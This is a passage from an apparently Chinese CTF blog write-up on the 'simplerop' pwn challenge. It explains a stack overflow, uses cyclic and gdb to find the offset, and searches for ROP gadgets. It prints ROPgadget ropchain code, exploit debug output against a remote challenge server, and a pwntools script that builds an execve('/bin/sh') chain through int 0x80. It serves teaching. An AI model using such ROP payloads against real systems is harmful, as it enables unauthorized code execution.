aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><s>由于实在是比较懒，没有截图，直接复制的bash的内容</s></p>
+<p>当然，ROPgadget也不是万能的，像angr需要我们添加适当的约束条件一样，针对<code>statically linked</code>的程序构造的ropchain都可以打通，需要我们根据程序人为的修改下，或者另寻他法。比如我们来看下这道题</p>
+<h5><span id="example-simplerop">Example-simplerop</span></h5>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">m1nus@ubuntu:~/elf/buu/simplerop$ <span class="token function">file</span> simplerop 
+simplerop: ELF <span class="token number">32</span>-bit LSB executable, Intel <span class="token number">80386</span>, version <span class="token number">1</span> <span class="token punctuation">(</span>GNU/Linux<span class="token punctuation">)</span>, statically linked, <span class="token keyword">for</span> GNU/Linux <span class="token number">2.6</span>.24, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>bdd40d725b490b97d5a25857a6273870c7de399f, not stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROP is easy is'nt it ?
+Your input <span class="token builtin class-name">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>程序运行后接收一次用户的输入，然后结束</p>
+<h6><span id="main">main()</span></h6>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-14h] BYREF</span>
+
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ROP is easy is'nt it ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your input :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里通过read()来接收用户的输入，单从源码来看的话，这里v4的长度是0x14，而接受的长度是100，也就是0x64，stackoverflow了</p>
+<p>静态链接那么我们首先还是尝试下<code>ROPgadget</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ROPgadget --binary simplerop  --ropchain</span>
+<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack
+
+<span class="token comment"># Padding goes here</span>
+p <span class="token operator">=</span> <span class="token string">b''</span>
+
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e82a</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bae06</span><span class="token punctuation">)</span> <span class="token comment"># pop eax ; ret</span>
+p <span class="token operator">+=</span> <span class="token string">b'/bin'</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a15d</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e82a</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea064</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 4</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bae06</span><span class="token punctuation">)</span> <span class="token comment"># pop eax ; ret</span>
+p <span class="token operator">+=</span> <span class="token string">b'//sh'</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a15d</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e82a</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08054250</span><span class="token punctuation">)</span> <span class="token comment"># xor eax, eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a15d</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080481c9</span><span class="token punctuation">)</span> <span class="token comment"># pop ebx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e851</span><span class="token punctuation">)</span> <span class="token comment"># pop ecx ; pop ebx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment"># padding without overwrite ebx</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e82a</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08054250</span><span class="token punctuation">)</span> <span class="token comment"># xor eax, eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080493e1</span><span class="token punctuation">)</span> <span class="token comment"># int 0x80</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>添加padding(具体长度后面来计算)构造好ropchain后，发送</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'/home/m1nus/elf/buu/simplerop/simplerop'</span> <span class="token assign-left variable">argv</span><span class="token operator">=</span><span class="token punctuation">[</span>b<span class="token string">'/home/m1nus/elf/buu/simplerop/simplerop'</span><span class="token punctuation">]</span> <span class="token builtin class-name">:</span> pid <span class="token number">14444</span>
+exp.py:9: BytesWarning: Text is not bytes<span class="token punctuation">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="token comment">#bytes</span>
+  io.recvuntil<span class="token punctuation">(</span><span class="token string">"Your input :"</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x23 bytes:
+    b<span class="token string">"ROP is easy is'nt it ?<span class="token entity" title="\n">\n</span>"</span>
+    b<span class="token string">'Your input :'</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0xa9 bytes:
+    00000000  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  │aaaa│aaaa│aaaa│aaaa│
+    *
+    00000020  2a e8 06 08  <span class="token number">60</span> a0 0e 08  06 ae 0b 08  2f <span class="token number">62</span> <span class="token number">69</span> 6e  │*···│<span class="token variable"><span class="token variable">`</span>···│····│/bin│
+    00000030  5d a1 09 08  2a e8 06 08  <span class="token number">64</span> a0 0e 08  06 ae 0b 08  │<span class="token punctuation">]</span>···│*···│d···│····│
+    00000040  2f 2f <span class="token number">73</span> <span class="token number">68</span>  5d a1 09 08  2a e8 06 08  <span class="token number">68</span> a0 0e 08  │//sh│<span class="token punctuation">]</span>···│*···│h···│
+    00000050  <span class="token number">50</span> <span class="token number">42</span> 05 08  5d a1 09 08  c9 <span class="token number">81</span> 04 08  <span class="token number">60</span> a0 0e 08  │PB··│<span class="token punctuation">]</span>···│····│<span class="token variable">`</span></span>···│
+    00000060  <span class="token number">51</span> e8 06 08  <span class="token number">68</span> a0 0e 08  <span class="token number">60</span> a0 0e 08  2a e8 06 08  │Q···│h···│`···│*···│
+    00000070  <span class="token number">68</span> a0 0e 08  <span class="token number">50</span> <span class="token number">42</span> 05 08  7f b2 07 08  7f b2 07 08  │h···│PB··│····│····│
+    00000080  7f b2 07 08  7f b2 07 08  7f b2 07 08  7f b2 07 08  │····│····│····│····│
+    *
+    000000a0  7f b2 07 08  e1 <span class="token number">93</span> 04 08  0a                        │····│····│·│
+    000000a9
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive
+$  
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>本地EOF</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Opening connection to node4.buuoj.cn on port <span class="token number">27544</span>: Done
+exp.py:9: BytesWarning: Text is not bytes<span class="token punctuation">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="token comment">#bytes</span>
+  io.recvuntil<span class="token punctuation">(</span><span class="token string">"Your input :"</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x23 bytes:
+    b<span class="token string">"ROP is easy is'nt it ?<span class="token entity" title="\n">\n</span>"</span>
+    b<span class="token string">'Your input :'</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0xa9 bytes:
+    00000000  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  │aaaa│aaaa│aaaa│aaaa│
+    *
+    00000020  2a e8 06 08  <span class="token number">60</span> a0 0e 08  06 ae 0b 08  2f <span class="token number">62</span> <span class="token number">69</span> 6e  │*···│<span class="token variable"><span class="token variable">`</span>···│····│/bin│
+    00000030  5d a1 09 08  2a e8 06 08  <span class="token number">64</span> a0 0e 08  06 ae 0b 08  │<span class="token punctuation">]</span>···│*···│d···│····│
+    00000040  2f 2f <span class="token number">73</span> <span class="token number">68</span>  5d a1 09 08  2a e8 06 08  <span class="token number">68</span> a0 0e 08  │//sh│<span class="token punctuation">]</span>···│*···│h···│
+    00000050  <span class="token number">50</span> <span class="token number">42</span> 05 08  5d a1 09 08  c9 <span class="token number">81</span> 04 08  <span class="token number">60</span> a0 0e 08  │PB··│<span class="token punctuation">]</span>···│····│<span class="token variable">`</span></span>···│
+    00000060  <span class="token number">51</span> e8 06 08  <span class="token number">68</span> a0 0e 08  <span class="token number">60</span> a0 0e 08  2a e8 06 08  │Q···│h···│`···│*···│
+    00000070  <span class="token number">68</span> a0 0e 08  <span class="token number">50</span> <span class="token number">42</span> 05 08  7f b2 07 08  7f b2 07 08  │h···│PB··│····│····│
+    00000080  7f b2 07 08  7f b2 07 08  7f b2 07 08  7f b2 07 08  │····│····│····│····│
+    *
+    000000a0  7f b2 07 08  e1 <span class="token number">93</span> 04 08  0a                        │····│····│·│
+    000000a9
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x2b bytes:
+    b<span class="token string">'timeout: the monitored command dumped core\n'</span>
+timeout: the monitored <span class="token builtin class-name">command</span> dumped core
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive
+$  
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>远程timeout</p>
+<p>很显然，这个方法就行不通了</p>
+<p>这道题程序没有got表，无法泄露函数的地址，没有<code>system</code>，没有<code>/bin/sh</code></p>
+<p>都没办法了试下系统调用呢，如果是需要用到系统调用就需要一个比较核心的指令——<code>int 0x80</code></p>
+<p>我们可以先通过ROPgadget来搜索看看，程序里有没有</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">m1nus@ubuntu:~/elf/buu/simplerop$ ROPgadget <span class="token parameter variable">--binary</span> simplerop <span class="token parameter variable">--only</span> <span class="token string">"int"</span>
+Gadgets information
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+0x080493e1 <span class="token builtin class-name">:</span> int 0x80
+
+Unique gadgets found: <span class="token number">1</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现有<code>int 0x80</code>，那后面就好构造了</p>
+<p>我们需要<code>int80(11 , '/bin/sh' , null , null)</code>，相当于执行的是<code>execve('/bin/sh' , 0 , 0)</code>，从而拿到shell</p>
+<p>程序也没有<code>/bin/sh</code>，需要我们读入，这里可以用read，下面开始构造payload</p>
+<p>首先是padding部分，上文说到从源码，包括IDA的栈试图来看<code>v2</code>都是0x14的大小，加上<code>0x8</code>就是<code>0x1c</code>，但是实际上会发现打不通，我们通过gdb+cyclic来看</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">m1nus@ubuntu:~/elf/buu/simplerop$ cyclic <span class="token number">200</span>
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>先生成200个数据，然后gdb让程序run起来，c到等待用户输入的地方，将200个数据复制进去</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Program received signal SIGSEGV, Segmentation fault.
+0x61616169 <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>
+LEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA
+───────────────────────────────────────────<span class="token punctuation">[</span>REGISTERS<span class="token punctuation">]</span>────────────────────────────────────────────────
+*EAX  0x64
+ EBX  0x80481a8 <span class="token punctuation">(</span>_init<span class="token punctuation">)</span> ◂— push   ebx
+*ECX  0xffffd0dc ◂— <span class="token string">'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'</span>
+*EDX  0x64
+ EDI  0x80ea00c <span class="token punctuation">(</span>_GLOBAL_OFFSET_TABLE_+12<span class="token punctuation">)</span> —▸ 0x80677d0 <span class="token punctuation">(</span>__stpcpy_sse2<span class="token punctuation">)</span> ◂— mov    edx, dword ptr <span class="token punctuation">[</span>esp + <span class="token number">4</span><span class="token punctuation">]</span>
+ ESI  0x0
+*EBP  0x61616168 <span class="token punctuation">(</span><span class="token string">'haaa'</span><span class="token punctuation">)</span>
+*ESP  0xffffd100 ◂— <span class="token string">'jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'</span>
+*EIP  0x61616169 <span class="token punctuation">(</span><span class="token string">'iaaa'</span><span class="token punctuation">)</span>
+──────────────────────────────────────────<span class="token punctuation">[</span>DISASM<span class="token punctuation">]</span>────────────────────────────────────────────────────
+Invalid address 0x61616169
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现会报<code>Invalid address 0x61616169</code>，我们把<code>0x61616169</code>复制，终端输入</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> cyclic <span class="token parameter variable">-l</span> 0x61616169
+<span class="token number">32</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>得到<code>32</code>，也就是实际的padding长度，<code>0x20</code></p>
+<p>接着还需要一些gadgets，我们需要控制寄存器里面的内容来控制函数的参数。<code>int80(11 , '/bin/sh' , 0 , 0)</code>可以看到需要4个值，分别对应的寄存器是<code>eax</code> , <code>ebx</code> , <code>ecx</code> , <code>edx</code></p>
+<p>还是通过ROPgadget来搜索</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x0806e850 <span class="token builtin class-name">:</span> pop edx <span class="token punctuation">;</span> pop ecx <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> ret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>拿到可以控制<code>edx</code> , <code>ecx</code> , <code>ebx</code>的gadgets，还差<code>eax</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x080bae06 <span class="token builtin class-name">:</span> pop eax <span class="token punctuation">;</span> ret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>找到一条单独的，gadgets就找完了</p>
+<p>由于这个程序没有开启pie，那bss段绝对地址不会发生改变，我们就可以将<code>/bin/sh</code>写入bss段，再进行调用</p>
+<p>有了这些前置条件，就可以来构造ropchain了</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> padding <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>payload第一部分是padding，覆盖函数返回地址，跳向哪里呢，下一步，我们需要调用read来向bss段上去读入<code>/bin/sh</code>，所以跳向read()</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx_ecx_dbx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>read()函数需要三个参数，我们就可以通过之前找到的<code>pop edx ; pop ecx ; pop ebx ; ret</code>来控制参数，从标准输入流中读取数据到bss段去，读取多少呢，只要比<code>/bin/sh</code>长就行，可以给个8。那么这里三个参数就是read(0 , bss_addr , 0x8)</p>
+<p>下一步，开始系统调用</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>int_80<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>首先是给四个寄存器复制，然后接着进行<code>int 0x80</code>，系统调用号为<code>11</code>，也就是<code>0xb</code>，所以eax为<code>0xb</code>，后面的寄存器赋值就是按照<code>('/bin/sh' , 0 , 0)</code>进行的，依次赋给这三个寄存器，然后跳到<code>int 0x80</code>来进行系统调用，注意参数是从右往左依次入栈的，这也是这样构造payload的原因</p>
+<p>至此，payload就构造完成了</p>
+<p>发送完payload后，再发送<code>/bin/sh</code>写到bss段上，为后续调用做准备</p>
+<h6><span id="exp">exp</span></h6>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"simplerop"</span><span class="token punctuation">)</span>
+host <span class="token operator">=</span> <span class="token string">"node4.buuoj.cn"</span>
+port <span class="token operator">=</span> <span class="token number">27544</span>
+local<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"0 for remote,1 for local:\t"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+io<span class="token operator">=</span>process<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>path<span class="token punctuation">)</span> <span class="token keyword">if</span> local<span class="token operator">==</span><span class="token number">1</span> <span class="token keyword">else</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your input :"</span><span class="token punctuation">)</span>
+padding <span class="token operator">=</span> <span class="token number">0x20</span>
+read <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+
+int_0x80 <span class="token operator">=</span> <span class="token number">0x080493e1</span>
+bss_addr <span class="token operator">=</span> <span class="token number">0x080EB584</span> <span class="token comment">#binsh is written here</span>
+pop_edx_ecx_ebx <span class="token operator">=</span> <span class="token number">0x0806e850</span>
+pop_eax <span class="token operator">=</span> <span class="token number">0x080bae06</span>
+payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> padding <span class="token operator">+</span> p32<span class="token punctuation">(</span>read<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>int_0x80<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
